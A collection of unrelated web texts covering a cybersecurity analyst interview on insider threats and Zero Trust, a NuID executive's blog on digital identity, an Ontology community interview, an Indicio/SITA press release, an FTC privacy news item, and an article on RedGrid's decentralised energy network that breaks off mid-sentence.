<p>However, this is not the only thing we have to worry about. One other major problem is the so-called skills gap in cybersecurity. Here we are talking about experts, actual security analysts, technicians, or people who are supposed to protect those, quote-unquote, innocent businesspeople. But you just don't have enough of them. And even those who are employed, are always overworked. They have too many things to deal with, but too little time. So, yes, that's skills gap. It's been, it's existed for a decade at least, and it's only growing. And there is no simple solution on how to address it.</p>
<p>And finally, last but not least, there are people in the company who make executive decisions. These are usually not the technical people. But again, might be your CEO or some other person who decides, OK, we should spend some money and deploy a new security solution. Or perhaps we shouldn't. Or we want to switch to a totally different business platform. Maybe it's Salesforce, maybe something else. But every new business platform comes with a set of new security risks. And if those executive people make those decisions without consulting with proper security specialists like us, for example, at KuppingerCole, this might lead to massive security and compliance problems afterward as well.</p>
<p>So I would say these are three major human factor problems we have to deal with.</p>
 In thinking about the human factor in cybersecurity as you described it right now, we also have to talk about the insider threat. What strategies and probably technologies can help organizations reducing the risk from such threats? 
<p>Again, when we talk about the insider threat, we have to think about multiple different kinds of it. The most obvious one is yes, the most common one is just negligence. People make mistakes. They click the wrong button, they delete a database. Or they click a wrong link and they end up firing off a ransomware attack. Theoretically, any employee can do that. They don't have to be an expert. They don't have to have special access rights, anything can happen. How do you deal with those? Well, it's everything you do, everything you plan and deploy and operate with regards to cybersecurity that has to somehow address all those challenges.</p>
<p>The other kind of insider threat is those disgruntled and privileged employees. Maybe they just want more money. Maybe they want to work for a different company and got to steal your trade secrets. Maybe they are colluding with a hacker and they might be even being blackmailed and forced to deploy malware just to let those hackers start their attack on your company. Again, this is very difficult to deal with because more often than not, you just cannot identify what is the difference between, quote-unquote, normal people acting normally. And again, those, the same people acting maliciously. Perhaps one of the most common ways to at least detect those attacks would be something behavior-based. But you have to observe how your workers act normally, how they work, how they do their daily jobs, and then identify when something uncommon happens, an anomaly. Unfortunately, most of the tools you can get for this purpose are pretty basic in terms of yes, they can identify that something unnatural is happening, but they will struggle to explain why exactly it is unnatural. What exactly is this anomaly about and why you should kind of put all other things aside and investigate it. Solutions that can explain it, I would say they belong to the quote-unquote, next-generation security analytic solutions.</p>
 If I understand you correctly, nowadays, when we no longer recognize the classical divide between inside and outside, we should not distinguish so much the threats from inside from those from outside, is that right? 
<p>Absolutely, not just should not, you cannot anymore, because well, first of all, for many companies, there is no inside anymore. And we are now still working from home for such a long time and will probably continue doing so. So if I am talking to you now from my own home, am I inside the company or not? And of course, a firewall would never detect me doing something malicious because there is no firewall at my home. And even if there was one, it's not connected to our corporate security. So absolutely, there is no more any difference between inside and outside. You have to treat every action, every activity, every potential threat, regardless of where it's coming from.</p>
 Is this where Zero Trust as a concept or strategy comes into play? 
<p>Exactly, Zero Trust, I would say, is a theoretical concept which attempts to address all of those challenges at once. Basically, Zero Trust is the philosophy, it's the idea of how you should completely redesign your corporate network and your corporate security architecture to make sure that you can deal with any of those, quote-unquote, insider threats, whether they happen inside the company or somewhere outside. For example, at home.</p>
<p>So yes, Zero Trust is exactly the solution, but unfortunately, Zero Trust is not a magic pill, not a panacea. It's not something that you can just buy, deploy and forget about. Zero Trust is a new way to operate your business if you will. And the tools are secondary.</p>
 Looking into the future: How do you think the threats will develop in the next three to five years? Will it become more serious or will the "good side" be able to develop faster than the "bad side"? 
<p>Well, I mean, here, in the field of security, we are always on the wrong side, if you will. We will never prevail because a hacker only needs one vulnerability to break your entire system, and you have to deal with all of them at the same time. If you only missed that one, oh, you lost already. So, unfortunately, I would not be optimistic. Cyber attacks will definitely grow in scope and number and power if you will. It's becoming even cheaper than ever now to stage a cyberattack. You can even get one as a service. You only need your credit card and maybe your blockchain or Bitcoin wallet to start with one. So in that regard, no, there is no light at the end of the tunnel, if you will. But there is some hope in the new technologies and in the new approaches to design in your corporate networks.</p>
<p>You've already mentioned Zero Trust. If there is a company that starts with Zero Trust, it doesn't have any legacy network at all. I would say it will be automatically protected from perhaps 95 percent of all the common cyberattacks. So it will never be completely secure, but it will make the job of their IT teams and security teams much, much easier. If you add strong authentication, for example, into the mix, just that alone is a major booster of cybersecurity. And of course, things like security automation. So if you have this combination of modern innovative security technologies, you will be much safer than before. You will not be safe, but at least you will be protected from a lot of drive-by attacks if you will, which are not specifically targeted at you but you will never be the collateral damage in such an attack.</p>
 Do I understand you correctly? Do you think that something like Autonomous Security, which makes security smarter, for example through machine learning, will help companies rule out the human factor in some future time? 
<p>Well, it's a difficult question because, again, we are talking about a thing which many people tend to misunderstand completely. Autonomous security does not equal automated security. Autonomous does not necessarily mean that it's operated by a robot or artificial intelligence. Yes, we know that AI is a huge buzzword nowadays. And we've observed a lot of interesting developments. But we know that even now in cybersecurity, nobody trusts AI to make security decisions. Simply because there is a lot at stake and a wrong decision can ruin your business completely, especially if it's something like manufacturing or high-speed financial trading. So people tend to mistrust AI.</p>
<p>And when we're talking about properly autonomous security, it's probably still managed by a team of security experts. But the team doesn't have to work for you. It might be just the managed service, a multi-tenant managed service even, so someone who's operating your security for you as a service from a remote location. But they are still kind of much closer to your infrastructure and your pain points and bottlenecks to quickly identify any attack. But again, there will still be a human, in the end, making a decision. But your goal is to make sure that that human is the best one, the smartest one, and the one supported by the best tools. So a robot will never replace a human in that regard. But they will help.</p>
 Do you think "never" is a word to be used in that context? 
<p>Well, I dread the times where robots will make all the decisions for us. I think they will be more like Skynet than benevolent...</p>

<p>Last week I wrapped up my first quarter here at NuID, which is also my first 90 days as <a href="https://nuid.io/about.html">COO</a> of the company since I started on July 1st.</p><p>Prior to July 1st it had been 20 years since the last time I formally “resigned” from one company and “joined” a completely different one. &nbsp;I have certainly started many new jobs, projects, roles, and relationships along the way, but this one has been a bit different. &nbsp;Reflecting on it now, the difference is that in the SAP/Ariba/Procurement technology world, my reputation—my identity—was always known even though the responsibility and team may change.</p><p>1998 was my first year as a professional consultant, and during an early performance feedback session my manager said to me something along the lines of, “you can only see into the future twice as far as you’ve come... &nbsp;you’ve only been on the job for 6 months; what do you want to be doing in a year?.” &nbsp;It stuck with me as a truth, I believe it was <a href="https://www.linkedin.com/in/dbarron/">David Barron</a> that told me that.</p><p>Sometime between 2013 and 2016 I had come far enough in my career and had enough Gladwell-esque sampling under my belt that certain other truths about my values had become quite clear to me. I realized that the teams I had been building, and that had built me, held these common truths as well.</p><p>Things like trust and loyalty are important to me, and I say that because I feel physically uncomfortable if lost, not because they are abstract concepts I’ve merely decided to abide by; they are things that I just am, just feel. &nbsp;Things also like accountability, follow-through, challenging the status-quo.</p><p>Things like learning to not mistake kindness for weakness and developing the experience to teach it as a lesson if I’m mistaken for weak. &nbsp;Things like at the end of the day, I can only work with people that I genuinely like and enjoy, because I can’t be successful if I’m not having a lot of fun while doing it.</p><p>I’ve also shared many times in coaching sessions, and have illustrated in my career that “the best way to get your next job is to be great at the job you have,” not to always be looking for your next move. &nbsp;The process of how I got to the decision to leave SAP-Ariba—and my family of 2,000 of the most amazing people to be found in eProcurement—is one that I’ve been very thoughtful about.</p><p>Starting sometime around the holidays of last year, my mind emotionally started to wander about “what’s, really next?”. &nbsp;I was having instincts I trust begin telling me to think about the next 20 years of my career.</p><p>As I pondered that question over several months, a few things I was able to determine were that:</p>
 
 
<p>I felt the end of the first half of my career was coming</p>
 
 
<p>I was not going to leave SAP to do SAP, or Procurement software elsewhere</p>
 
 
<p>Application verticals are not where I want to be</p>
 
 
<p>Platforms, hyperscalers, low-code/no-code, P2P, and distributed Web3 technologies is where the tip of the spear is</p>
 
 
<p>Identity management is a big internet problem, it’s a separate and common problem across all of these enablers for the Web of the future. And THAT, I’m interested in most indeed!</p>
 
 
<p>I was feeling a draw towards what I was calling Identity Management at the time and began looking into Enterprise Identity SaaS providers</p>
 
 
<blockquote>
<p>Side note – it’s probably not coincidence that <a href="https://www.linkedin.com/in/jason-wolf-ismatsap/">Jason Wolf</a> resigned less than a month before I did to become Ping Identities Chief Revenue Officer.  Jason and I “grew up” together at Ariba and SAP after both graduating from Texas A&amp;M.  We spoke often, including about careers, but neither of us told the other where we were going, or asked.  I learned from Jason’s LinkedIn announcement, chuckled, and was not surprised.</p>
</blockquote>
<p>In December and January, I had paid $1,700 to have a professional writer begin compiling some form of a resume for me. &nbsp;I truly did not have one for over 15 years; I needed only to rely on my identity and my reputation. &nbsp;Since I sensed a different kind of change was coming for me, I felt I needed serious resume help, and yet that resume was never used for the same reason I hadn't needed one in the 15 years prior.</p><p>In late March I was walking back from my mailbox while simultaneously texting with my aunt, Sarah. &nbsp;Sarah randomly told me of a company that she had invested in that I should look into called NuID (“(New Id)” she included, so I didn’t think it was pronounced “Noooooid”).</p><p>It made me stop walking, stand still, and google NuID. &nbsp;A few minutes later, still standing there with mail tucked under my arm, I replied “Well Sarah, personally I am looking to invest in and join a group in identity management specifically, or platforms in general. &nbsp;I like what NuID is doing, that is the type of group I want to join and lead to grow, good stuff right there!”</p><p>Within 48 hours I had spoken to my cousin and arranged for him to introduce me to Locke. &nbsp;My entire family made a weekend trip to Birmingham to visit family, and to meet with Locke for 6 hours straight on Saturday and again at brunch on Sunday. &nbsp;For the next two months, I, and NuID, did as much due-diligence as we could, and then I joined the team.</p><p>That we know, but I’ve been thinking about it in terms of Relationships, Identity, Credentials, Verification, and Reputation – a big Web2.0 problem, without a real solution prior to NuID for a while now so I want to play back that very natural, organic vetting and transacting that occurred between NuID and I with a bit more simplicity, and specificity, to ultimately help illuminate the mechanics of identity as they play out in the real world.</p>SAP ID #835427 
 
<p>I was an SAP employee from 2012 to 2021 and as such, I possessed a Verified Credential with SAP ID # 835427.</p>
 
 
<p>Over those years I developed a strong Reputation within the Ariba and SAP community and progressed through my career, which is easily verified on LinkedIn, or by talking to my team.</p>
 
 
<p>In late March I was walking back from the mailbox when I got a random text from my aunt Sarah that “she had a thought”.  Sarah had invested in a company called NuID that she thought I would be very interested in.</p>
 
 
<p>Sarah learned of NuID because she saw Locke Brown grow up, since Locke and her son went to junior-high and high school together she personally knew Locke.</p>
 
 
<p>Sarah isn’t a technologist, far from it actually, but she is a successful doctor and businesswoman.  So, it wasn’t a keen eye toward SSID, it was her son’s attestation of NuID’s Credentials, and her personal experience with Locke’s reputation that gave her confidence to invest.</p>
 
 
<p>Similarly, Sarah verifying Locke’s Credentials with me, gave me the attestation I needed begin digging into NuID, intensely.</p>
 
 
<p>Locke, as human nature is, essentially got attestations from my cousin and aunt that I am indeed, Jason Jablecki and that I have the Credentials necessary. So we met via a personal email introduction from my cousin.</p>
 
 
<p>As June 30th turned to July 1st, I turned in my SAP employee credential and was granted my NuID employee credential</p>
 
 
<p>You see… Identity is the fact of being who or what a person or thing is, and Authentication is how we know that the Identity is indeed, The Fact. &nbsp;Once we have authenticated the factual-identity of a person, place, thing, device, anything, and we trust its verified credentials, it can exchange digital assets or participate trustlessly in any peer-to-peer digital, and digitally enabled physical interaction.</p><p>After Authentication, it is really the composite of an identity’s qualification, achievement, personal quality, or aspect of a person's background that make up how we tend to think of identity, or reputation of a person day to day.</p><p>Credentials are elemental to Identity, and we know this instinctively as humans.</p> 
 
<p>Go shopping and present debit card as a credential that authorizes financial settlement for the exchange of assets.</p>
 
 
<p>Travel using CLEAR and your biometric credential authorizes an agent to escort you more quickly through TSA.</p>
 
 
<p>Our verifiable identities are elemental to our interactions, our transactions, our possession, therefore, authentication is elemental for identities.</p><p>So once again, let’s play my story out, this time through the self-sovereign identity layer of Web3.0, by using the backwards compatible Web2.0-bridging NuID Authentication Protocol.</p><blockquote>Safe harbor: this is an imaginary, futuristic scenario that did not take place, and even though all of it is possible with the NuID elements available today, none of the parties are real</blockquote> 
 
<p>I was a NuSAP employee through June of this year.  NuSAP had implemented the NuID Authentication Protocol element in Q1 and deleted all employee passwords, so my verified NuID was created at that time and SAP attested my Employment Credential to it.</p>
 
 
<p>During my time with NuSAP I developed a strong reputation, held many different positions, got certifications, and titles, all of which was attested as credentials to my Identity by NuSAP and other third parties.</p>
 
 
<p>In late March of this year I was walking back from the mailbox, simultaneously texting with my aunt, who told me of NuID, and that NuID is looking for a COO.</p>
 
 
<p>My aunt connected me to Locke Brown, with whom I shared relevant aspects of my Nu Identity, which now has quite a reputation given all of the “credentials” I’ve acquired.</p>
 
 
<p>NuSAP’s automated offboarding process ran on June 30th, removing my employee credential from my NuID, and NuID Inc. attested my Nu Employee Credential.</p>
 
 
<p>Thinking through identity process and applications of the NuID protocol is something I’ve been doing a lot of lately while we’re not working on the Kii launch, our Q2 consumer product release, and talking to enterprise and partner prospects. &nbsp;I’ll close this, my first NuID blog, by sharing a whiteboard that I did last week with the team, which is referred to as, the comic book:</p><p>Look out for more blogs, comics, and content from the NuID team and for exciting news to come as we execute on our roadmap toward a sovereign identity ecosystem.</p><p>—Jason</p>

 This is an ongoing series featuring Ontology’s Harbingers. Harbingers are exceptional leaders that help Ontology grow its community and ecosystem, making it an ever-stronger blockchain, and decentralized identity and data&nbsp;leader. <p>In the ninth interview in this series, Ontology speaks with SoloTürk, administrator of our <a>Turkish Community</a>.</p> 1. How did you hear about Ontology? What drew your attention to Ontology? <p>I discovered Ontology for the first time on CoinMarketCap in January, 2018. I liked the name Ontology, so I did some research.</p> 2. Why did you become a supporter of Ontology and a champion of its&nbsp;brand? <p>I became a supporter as I saw very little activity in the Ontology Turkish group. So I asked if I could be a part-time supporter and help strengthen the group, and now I am a big supporter. My group is much more active, and we also have a Free Technical Analysis Signals&nbsp;group.</p> 3. What’s the key role of a Harbinger? What’s your favorite thing about being a Harbinger? <p>I want to strengthen the team and grow the community.</p> 4. Why is it important to you to be a part of the Ontology community? <p>I want to follow up on the latest news from Ontology and share the news and ideas within our Ontology community.</p> 5. How is the Ontology community different from other blockchain communities, is there anything that makes it stand&nbsp;out? <p><a href="https://medium.com/ontologynetwork/learn-what-it-takes-to-become-the-next-ontology-harbinger-8c55c49dc856">The Harbinger program</a> is not available in other blockchains or other communities. I have not seen it or heard of anyone else doing a similar&nbsp;program.</p> 6. What do you use as your main channels for interacting with the Ontology community and why? Do you want to see&nbsp;more? <p>Twitter and Telegram for now, but maybe Instagram in the&nbsp;future.</p> 7. Can you share an unforgettable experience or something you learned from being a Harbinger? What advice would you give to someone who wants to be a journalist? <p>My advice would be to stay active in the project. Supporting the project as much as you can, helping them to build the future, and sharing your knowledge with&nbsp;others.</p> 8. How would you describe the Ontology community in three&nbsp;words? <p>Active, Quality, Technology.</p> 9. How do you think Ontology can expand its community going forward? What would you like to see more/less? What kinds of things do you see community members doing that you think have helped our community grow? <p>Hosting AMAs each week in other Telegram groups with other public chains, or by inviting them and mingling with them and organizing activities together.</p> 10. What do you see as key milestones for Ontology and how can the community help achieve&nbsp;them? <p>Now Ontology is 3 years old and I hope to see more collaborations with other companies or public chains, to let the world know how wonderful Ontology&nbsp;is.</p><p>To learn more about Ontology’s Harbinger Program and how you can get involved, check out our updated&nbsp;<a href="https://medium.com/ontologynetwork/learn-what-it-takes-to-become-the-next-ontology-harbinger-8c55c49dc856">GUIDE</a>.</p> Want more Ontology? <p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

				  Decentralized identity solution developer and air transport technology provider nominated for Blockchain Services Award in the Tools &amp; Middleware category  
			  
				
				
				 <p>SEATTLE — October 06, 2021 — <a href="https://indicio.tech/">Indicio</a>, the world’s leading provider of decentralized identity development and hosting solutions and <a href="https://www.sita.aero/">SITA</a>, the leading provider of IT to the air transport industry, today announced they were finalists in the Blockchain Services Award: Tools &amp; Middleware category in the <a href="https://blockchainrevolutionglobal.com/the-eb-awards/">Enterprise Blockchain Awards</a> (EBAs) presented by the <a href="https://www.blockchainresearchinstitute.org/enterprise-blockchain-awards/">Blockchain Research Institute.</a> The partnership was recognized for their work on the <a href="https://www.sita.aero/resources/videos/happy-traveler-card/">Aruba Secure Health Card</a>, a successful pilot&nbsp; for sharing health information in a privacy-preserving way using distributed ledger technology that debuted earlier in the year with the assistance of the Aruba Health Department.</p>
<p>“Indicio is proud to be a finalist for this award, which recognizes the power of blockchain-based technology to create a world in which the ability to trust data is possible — thank you BRI and EBA,” said Heather Dahl, CEO of Indicio. “I also want to also thank our partner in this project,&nbsp; SITA, for its vision and leadership in the air travel industry, and for seeing how this technology can change the way we travel and deliver so many benefits to passengers in the future.”</p>
<p>A distributed blockchain-based ledger is at the foundation of Indicio and SITA’s project. It serves as an anchor for verifiable digital credentials that enable people to hold, share and prove important information in a way that preserves privacy and improves security.</p>
<p>“For the Aruba Secure Health Card, we wanted travelers to Aruba to share proof that they had tested negative for COVID as they visited hotels and restaurants on the island,” said Dahl. “Our goal was to have travelers share their status in a way that didn’t require sharing any personal identifying information with the businesses they visited—or require those businesses to record any personal information. We call this a Trusted Data Ecosystem. It’s where information can be shared and verified in a secure, privacy-preserving way and without the need for third parties to be involved in the flow, management, or storage of that information. Removing third parties is&nbsp; vital to both data privacy compliance and to implementing a Zero-Trust approach to security. Trusted Data Ecosystems are our solution to the problem of trust online.</p>
<p>New this year, the Blockchain Service Award category celebrates providers of blockchain technologies and services. It recognizes companies, government agencies, or nongovernmental entities delivering blockchain solutions to transform their clients’ operations, supply chains, or ecosystems. This category offers an opportunity to showcase the tangible and long-term change that blockchain service providers are working to support.</p>

<p>The Federal Trade Commission could go harder on consumer privacy protection and cybersecurity with President Biden’s recent nomination of digital “privacy hawk” and law professor&nbsp;<a href="https://techcrunch.com/2021/09/14/alvaro-bedoya-ftc-biden/">Alvaro Bedoya</a>&nbsp;and House Democrats’&nbsp;<a href="https://www.washingtonpost.com/us-policy/2021/09/09/democrats-tech-reconciliation/">proposal</a>&nbsp;to allocate $1 billion for a new privacy and data security bureau.</p>



<p>If confirmed, Bedoya will join Biden’s other pick, antitrust expert and now FTC chair,&nbsp;<a href="https://techcrunch.com/2021/06/15/lina-khan-ftc-confirmed/">Lina Khan</a>. Both are prominent critics of Big Tech data collection and surveillance and seen as a potentially&nbsp;<a href="https://techcrunch.com/2021/09/14/alvaro-bedoya-ftc-biden/">“formidable regulatory presence”</a>&nbsp;in reining in the tech industry.&nbsp;</p>



<p>As founding director of the&nbsp;<a href="https://www.law.georgetown.edu/privacy-technology-center/">Center on Privacy &amp; Technology</a>&nbsp;think tank at Georgetown University and former chief counsel to the Senate Judiciary Subcommittee on Privacy, Technology and the Law, Bedoya’s work is in major privacy tech issues including mobile location data, stalkerware and facial recognition.</p>



<p>Bedoya is known for his bipartisan approach to privacy as a human right. We look forward to seeing what comes next for data protection.</p>

<p>Forty-nine degrees Celsius outside. Suddenly, the climate crisis felt pretty real.</p><p>As I started writing this article back in June, sweltering in my home office, western North America was in the grip of a <a href="https://www.cbsnews.com/news/heat-wave-dome-2021-seattle-portland-weather/">bizarre and unusual</a> heat wave. One town a few hours west of me <a href="https://www.nytimes.com/2021/06/30/world/canada/bc-canada-heat-wave.html">broke the all-time Canadian record</a> at 49.6°C (121°F), and was <a href="https://www.msn.com/en-us/news/us/e2-80-98our-poor-little-town-of-lytton-is-gone-e2-80-99-village-at-center-of-canada-e2-80-99s-heatwave-devastated-by-e2-80-98catastrophic-e2-80-99-fires/ar-AALFvbd">incinerated in a wildfire</a> later that week.</p><p>The last decade has seen more than its share of wildfires up and down the west coast; some years I’ve forgotten what it was like to breathe clear air and see the stars. Meanwhile, Germany, Belgium, and the southwest US were drenched in <a href="https://www.msn.com/en-us/news/world/europe-flooding-record-rainfall-leaves-over-120-dead-in-western-europe-devastating-parts-of-germany/ar-AAMdTGY">catastrophic floodwaters</a>.</p><p>This isn’t normal.</p><p>I usually have to experience something myself in order to really appreciate it. It takes me from “of course I care, in an abstract way” to “holy cow, we’ve got to do something about this.” I expect a lot of us work that way.</p> So what can we do? <p>I’m not sure. But one thing I do know is that we have enough science to diagnose the problem and solve it. On the front end, we need to <a href="https://350.org/science/">stop releasing greenhouse gases</a> into the atmosphere; on the back end, we need to <a href="https://www.bbc.com/future/article/20130226-amazon-lungs-of-the-planet">stop damaging our planet’s lungs</a>. We can <a href="https://www.permaculturenews.org/2016/06/29/john-d-liu-interview-possible-rehabilitate-large-scale-damaged-ecosystems/">rapidly repair and even enhance</a> our planet’s capacity to support life with the tools we already have available. And if we do it right, we could even <a href="https://www.chelseagreen.com/product/farming-while-black/">rebalance inequity</a> and improve the <a href="https://www.csuchico.edu/regenerativeagriculture/blog/nutrient-density.shtml">quality of our food</a> in the process.</p><p>What we don’t know is how to coordinate our efforts — all 7.9 billion of us, and counting — to reach these goals. In a recent interview, thinker and futurist <a href="https://www.humanetech.com/podcast/a-problem-well-stated-is-half-solved">Daniel Schmachtenberger argues</a> that <a href="https://consilienceproject.org/about/">if we can</a> solve this problem, all the other problems will get solved automatically.</p> Energy, one piece of the pie <p>All the brightest and darkest things in our modern civilisation come from our capacity to harness the energies of the universe. And right now most of those energies come as fossil fuels — coal, petroleum, and natural gas. <a href="https://ourworldindata.org/emissions-by-sector">Almost three quarters</a> of the greenhouse gases we emit come from energy production. That’s because <a href="https://ourworldindata.org/energy-mix#energy-mix-what-sources-do-we-get-our-energy-from">82% of that energy</a> comes from fossil fuels. And we’re using <a href="https://ourworldindata.org/grapher/global-primary-energy">more and more energy each year</a>.</p>Of humanity's greenhouse gas emissions, 73% comes from energy consumption – electricity, heating, transportation, and industry. The energy we consume comes primarily from fossil fuels, while only 18% comes from renewables and nuclear power. (Note: because of rounding errors, the percentages in this graphic don't quite add up to 100%.)<p>This tells me two things: we need to learn how to use less energy, and the energy we do use must come from low-carbon sources. As far as we know, that means we need to <a href="https://ourworldindata.org/electricity-mix#electricity-is-only-one-part-of-total-energy-decarbonizing-electricity-is-only-one-step-towards-a-low-carbon-energy-system">electrify</a> <a href="https://www.weforum.org/agenda/2020/04/can-electricity-decarbonize-the-energy-sector/">everything</a>.</p><p>But low-carbon electricity carries a new set of coordination problems.</p><p>First, most renewables are <a href="https://en.wikipedia.org/wiki/Duck_curve">not well-matched with demand</a>. Let’s take a look at solar electricity. When we start brewing our morning tea, the sun is still rising. Then there’s a sort of peak production — too much power in the grid — in the middle of the day when we’re off at work. In the evening, just when we’re cooking supper, the sun is already going to bed. It won’t do us any good to switch to renewable electricity if it’s not actually there when we need it.</p>A graph taken from a typical October day in a California power utility shows a steep rise in solar electricity generation from 08:00, which begins to fall at 15:00 and is virtually non-existent at 18:00. Combined with high demand in the morning and evening, this creates a 'duck curve'.<p>Second, power producers and distributors build their infrastructure to meet peak demand, not average demand. If we electrify everything, that would mean more drastic peaks, which would mean more power plants and fatter wires. And every tonne of concrete and steel, every kilometre of copper wire, every wind turbine, every hectare of solar panels, is the product of <a href="https://en.wikipedia.org/wiki/Life-cycle_greenhouse_gas_emissions_of_energy_sources">carbon-intensive manufacturing processes</a>.</p><p>Third, consumers are also becoming producers, and it’s happening quickly. <a href="https://www.energymagazine.com.au/energy-disruption-is-here-but-not-as-we-expected/">Over a fifth of Australian homes</a> have rooftop solar panels, and <a href="https://www.forbes.com/sites/jamesellsmoor/2019/07/17/mini-grids-are-ready-to-change-the-world-again/?sh=680624eca164">minigrids</a> and <a href="https://en.wikipedia.org/wiki/Community_solar_farm">community solar gardens</a> are on the rise. Distributed energy production is already here. That’s wonderful, but the grid is designed for one-way delivery of electricity generated by large plants whose output is easy to predict.</p><p>Our infrastructure <a href="http://www.mefco2.eu/news/decarbonization-digitalisation-decentralisation-energy-sector.php">isn’t prepared</a> to handle these challenges. It’s big and unwieldy. Teaching it to respond to these new demands would be like teaching a team of oxen to fly like a flock of starlings.</p><p>But starlings are exactly what we need. Many small energy producers and consumers, responding nimbly to each other, moment by moment. Analysts tell us that the most reasonable way to do this is to <a href="https://www.caf.com/en/knowledge/views/2019/11/the-3-ds-of-energy-decarbonization-digitization-and-decentralization/">decentralise and digitalise</a> the grid as we decarbonise.</p><p>Coordination is necessary, but it appears exceedingly difficult at the same time.</p><p>Given the risks we face, this is sobering.</p><p>Fortunately, there are people working on these challenges already. I’d like to introduce you to one such group of visionaries.</p> The Internet of Energy Network: teaching toasters to fly <p>In 2018, Dr Adam Bumpus, Alex Evans, and Sim Wilson came together with a desire to tackle the challenges of energy coordination. If they could figure this out, they knew they could help the world move toward a <a href="https://whatsyour2040.com/">brighter future</a>.</p><p>One of their first questions was, “what if we could build coordination capacities into the things that already exist?” I appreciate their choice to ground high ideals in reality. Instead of pushing the grid to change, they started at the bottom with individual devices in homes and businesses.</p><p>The trio called themselves RedGrid, assembling a team to help them imagine ways to get all these devices talking to each other. They asked what would happen if they were to connect together into ‘virtual microgrids’ and eventually into a global ‘software-defined grid’ giving intelligence to the existing physical grid. Production and storage devices, side by side with our air conditioners and fridges and ovens, making decisions together in response to changes in supply and demand. Just like a flock of starlings.</p><p>Mike Gamble, the company’s lead architect, describes this approach as “grassroots, bottom-up, organic.” Anyone who wants to join the flock is welcome.</p><p>As they built out this vision, they called it the <a href="https://www.ioen.tech/">Internet of Energy Network</a> (I’ll call it IOEN, pronounced “ion”, for short). Given what I learned about the inflexibility of the current energy grid, this approach makes a lot of sense. It won’t require everything to change at once, which means that it has a chance of actually working. Regardless of how many people and organisations end up getting involved, something meaningful can happen at every scale. As more layers are added, the benefits start compounding.</p><p>And it happens to mesh nicely with the greenest, least complicated carbon reduction technique: just use less energy.</p><p>Even without taking advantage of the IOEN, RedGrid has an app that <a href="https://redgrid.io/for-households/">talks to smart appliances</a> (and not-so-smart appliances using smart plugs). At its most basic, it helps people monitor their energy consumption; this alone has been <a href="https://link.springer.com/article/10.1007/s12053-019-09777-z">shown to reduce people’s consumption patterns</a>.</p><p>It also allows people to schedule energy-hungry appliances, like their dishwasher, in the <a href="https://youtu.be/O-lv-3AeIms">middle of the day</a> when green energy is plentiful. This doesn’t reduce consumption by itself, but it can help them green the energy they do consume, or get better rates and even rebates by taking advantage of their energy company’s <a href="https://en.wikipedia.org/wiki/Demand_response">demand response</a> incentives. This doesn’t just save people money and make them feel good; it also prevents more infrastructure from being built. Remember that power companies build to meet peak demand — if we can flatten the peaks, the grid can be leaner.</p><p>Their software can also use machine learning to help long-running machines, such as air conditioners and pool pumps, use less power without sacrificing comfort.</p><p>If everyone added this sort of smarts to their individual energy use, we’d likely see both consumption and peak demand start to drop across the world. It’d help — to an extent. But the RedGrid team thinks that the real reductions will happen when these devices can break through the four walls around them and start talking to their neighbours.</p><p>Devices in the IOEN will be able to emit signals for other devices to respond to. At noon the community solar farm could say “we’re flooded with energy right now; can anyone use it?” Hundreds of dishwashers and car chargers, waiting for just such a signal, would turn on in response. Or in the evening the utility could say “we’re getting stressed; could everyone go easy for a while?” and air conditioners, pool pumps, and <a href="https://www.solarquotes.com.au/blog/hot-water-vpp-mb1870/">water heaters</a> would scale back.</p><p>It gets more interesting when devices, and the people who own them, can talk directly to each other. Rather than overwhelming the community solar farm all at once, all those dishwashers could arrange to take turns. Or, if someone knows they’re going to be using a lot more electricity than usual — maybe they’re cooking for a big birthday party — they could let their neighbours know. People like being neighbourly, so they’re likely to make accommodations for that. Mike suggested that it could even spur a bit of friendly competition among virtual microgrids, an energy-saving drive: “You may have a group that is your sports team, and you are aiming to do better energy-wise against another team.”</p><p>And with the increase in local generation and storage — rooftop solar and electric car batteries — energy consumers could also be providers, selling their surplus to their neighbours. Local generation reduces the burden on infrastructure even further and makes everyone more resilient to power outages.</p><p>The IOEN is simply the communication layer that makes all this possible; the real magic happens in the applications built on top of it. RedGrid sees more opportunities on the horizon.</p>  Virtual microgrids can aggressively optimise their energy use, offer their combined optimisations as a package to energy companies, and distribute the rebates to members.  Physical microgrids such as Monash University’s <a href="https://www.monash.edu/net-zero-initiative">Net Zero</a> project (<a href="https://www.afr.com/technology/the-tech-firm-overhauling-energy-by-creating-mini-grids-driven-by-ai-20190627-p521xi">partnering</a> with RedGrid) can build smaller systems if they can rely on the IOEN to help smooth out demand peaks.  If grid operators and power producers choose to use aggregated, anonymised data from individuals and virtual microgrids, they can do an even better job of planning, building out, and maintaining their infrastructure.  As the network grows, third-party service providers can pop up, offering intelligence and insights to help everyone reduce their energy use even further.  Equipped with IOEN-based management software, new microgrid projects could receive investor money in exchange for a stake in revenues, accelerating the adoption of renewables.  <p>The Rocky Mountain Institute calls this <a href="https://rmi.org/insight/the-economics-of-demand-flexibility-how-flexiwatts-create-quantifiable-value-for-customers-and-the-grid-executive-summary/">demand flexibility</a>, predicting that it can <a href="https://rmi.org/insight/the-carbon-emissions-impact-of-demand-flexibility/">reduce energy-related emissions</a> by up to 40% as energy electrifies and decarbonises. But they see electricity pricing as the main coordination tool. RedGrid’s vision for the IOEN embraces pricing but goes beyond it, giving us a way to coordinate directly and explicitly with each other.</p> Why decentralisation? <p>Good question. Decentralised coordination is messy and awkward. If you’ve ever tried to organise a multi-family camping trip, you know what I’m talking about.</p><p>First of all, when we’re dependent on faraway, centralised infrastructure and all the stuff that connects us to it, we’re in a vulnerable position. This goes for both electricity generation and the digital tech needed to make it ‘smart’. What if the power plant, the <a href="https://www.protocol.com/enterprise/slack-outage-january-aws">machines in the data centre</a>, or any of the miles of wiring between them and our town, go offline (or even <a href="https://www.theregister.com/2021/03/10/ovh_strasbourg_fire/">burn down</a>)? Suddenly we’re stranded. With rooftop and community solar, <a href="https://en.wikipedia.org/wiki/Tesla_Powerwall">home batteries</a>, and <a href="https://en.wikipedia.org/wiki/Edge_computing">edge computing</a>, we have the means to stay online, right in our home town.</p><p>Second, the further away the power source is from your plug, the <a href="http://insideenergy.org/2015/11/06/lost-in-transmission-how-much-electricity-disappears-between-a-power-plant-and-your-plug/">more energy is lost</a>. It’s not a huge deal, but local generation does come out a little bit ahead.</p><p>Lastly, the rising complexity of the modern grid, along with the decisions we need to make, will virtually demand it. Zillions of new internet-connected plugs, toasters, solar panels, and car chargers will be coming online, producing lots of data and expecting to be able to make split-second decisions based on current local conditions. This is a <a 